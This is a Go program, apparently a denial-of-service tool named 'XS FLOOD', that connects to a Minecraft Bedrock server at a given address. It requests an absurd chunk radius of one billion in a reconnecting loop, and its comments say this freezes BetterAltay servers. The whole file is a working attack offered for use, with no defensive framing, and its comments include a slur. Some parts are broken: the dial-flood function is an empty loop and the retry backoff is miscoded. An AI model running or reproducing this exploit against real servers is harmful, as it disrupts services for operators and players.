package main

import (
    "github.com/sandertv/gophertunnel/minecraft"
    "github.com/sandertv/gophertunnel/minecraft/auth"
    "github.com/sandertv/gophertunnel/minecraft/protocol/login"
    "github.com/sandertv/gophertunnel/minecraft/protocol/packet"
    "log"
    "os"
    "fmt"
    "time"
)

func main() {
    if len(os.Args) < 3 {
        log.Fatalf("Usage: %s <target IP> <target port>", os.Args[0])
    }

    targetIP := os.Args[1]
    targetPort := os.Args[2]

    clientData := login.ClientData{
        ThirdPartyNameOnly: true,
        MaxViewDistance:    320000, // Better altay is retarded accept
        MemoryTier:         100,    // Typical memory tier
        IsEditorMode:       false,
        DeviceModel:        "device_model",
        GameVersion:        "1.21.50", // .41 :(
        PremiumSkin:        true,
        ThirdPartyName:     "Username",
        SkinData:           "",
        CurrentInputMode:   1,
        CapeData:           "",
    }

    identityData := login.IdentityData{
        DisplayName: "XS FLOOD", // USELESS FOR NOW
    }

    dialer := minecraft.Dialer{
        ClientData:   clientData,
        IdentityData: identityData,
        TokenSource:  auth.TokenSource,
    }

    for {
        var conn *minecraft.Conn
        var err error
        baseDelay := time.Second

        for {
            conn, err = dialer.Dial("raknet", targetIP+":"+targetPort)
            if err == nil {
                log.Println("Sent login dial")
                sendMultipleDials(conn, 50000)
                break
            }
            log.Printf("Error (may be outdated client or spawn): %v. Retrying in %v...\n", err, baseDelay)
            time.Sleep(baseDelay)
            baseDelay = 1
            if baseDelay > time.Minute {
                baseDelay = time.Minute 
            }
        }

        if err := conn.DoSpawn(); err != nil {
            log.Printf("DoSpawn error: %v", err)
            continue 
        }

        // Read packets from the connection until finish
        for {
            pk, err := conn.ReadPacket()
            if err != nil {
                log.Printf("ReadPacket error: %v. Reconnecting...\n", err)
                break
            }

            switch p := pk.(type) {
            case *packet.Emote:
                fmt.Printf("Emote packet received: %v\n", p.EmoteID)
            case *packet.MovePlayer:
                fmt.Printf("Player %v moved to %v\n", p.EntityRuntimeID, p.Position)
            }

            // Wont crash pm cuz theres max render of 32 chunks,
            //unlike better altay it will accept and freeze
            p := &packet.RequestChunkRadius{ChunkRadius: 1000000000}
            if err := conn.WritePacket(p); err != nil {
                log.Printf("WritePacket error: %v. Reconnecting...\n", err)
                break
            }
        }
    }
}

func sendMultipleDials(conn *minecraft.Conn, numDials int) {
    for i := 0; i < numDials; i++ {
        //log.Printf("Dial #%d sent\n", i+1)
    }
}
